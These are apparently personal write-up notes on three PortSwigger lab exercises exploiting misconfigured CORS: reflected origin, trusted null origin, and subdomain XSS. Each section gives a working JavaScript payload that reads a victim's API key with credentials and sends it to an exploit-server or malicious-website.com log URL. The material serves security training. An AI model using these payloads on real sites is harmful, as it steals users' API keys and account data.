### 1. Lab: CORS vulnerability with basic origin reflection
> This website has an insecure CORS configuration in that it trusts all origins.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: `wiener:peter`

If we check the requests while login, we will see it is getting the API Key from `/accountDetails`.
![[Pasted image 20250214071745.png]]
Now, changing Origin to `example.com` will reflect in response, that means, it is vulnerable to CORS. So, we will try a exploit script, there it will send the response to our server, in this case, exploit server.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ac300c6038b7a0384e0b383001d0009.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='/log?key='+this.responseText;
};
</script>
```
![[Pasted image 20250806150402.png]]
> Solution: after sending this exploit to victim, you will get the key in "Access Logs" page, and lastly, in order to solve the lab, you have to submit the key.

### 2. Lab: CORS vulnerability with trusted null origin
> This website has an insecure CORS configuration in that it trusts the "null" origin.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: `wiener:peter`

Let's check the it the origin is reflected in response.
![[Pasted image 20250214072603.png]]
It doesn't. Let's check if null value is reflected or not in response.
![[Pasted image 20250214072639.png]]
Yes, it does. Alright, so we will use iframe payload in order to solve this lab.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a6900760429379185106c28000a0005.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0ab9005904c9371285646b9e01020084.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
> solution: send this payload and get API key in logs, by submitting API key, it will solve the lab.

### 3. Lab: CORS vulnerability with trusted insecure protocols
> This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: `wiener:peter`

Firstly, I have checked if `https://example.com` or `null` is getting reflected in response, but it doesn't. Next thing I have tried is to send subdomain, it worked actually. So I have tried to find the other subdomain by checking the functionality of the website. In stock of product page, we can see it is having `stock` as subdomain. Let's see what happens if we tweak the value.
![[Pasted image 20250214082141.png]]
We can see we are getting XSS. We can leverage this XSS to get sensitive info using CORS.
```html
<script>
document.location = "https://stock.0a6000ca03cb92e581536615003700af.web-security-academy.net/?productId=<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='//malicious-website.com/log?key='+this.responseText;
    };</script>&storeId=1
</script>
```
making the payload one liner and encode necessary characters like `+` sign and `<` of ending script in order to make it work.
```html
<script>
document.location = "https://stock.0a6000ca03cb92e581536615003700af.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://0a6000ca03cb92e581536615003700af.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a96009703d692688189650401aa0091.exploit-server.net/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
</script>
```
> Solution: Submit the payload, get the api key and submit the key in order to solve the lab.

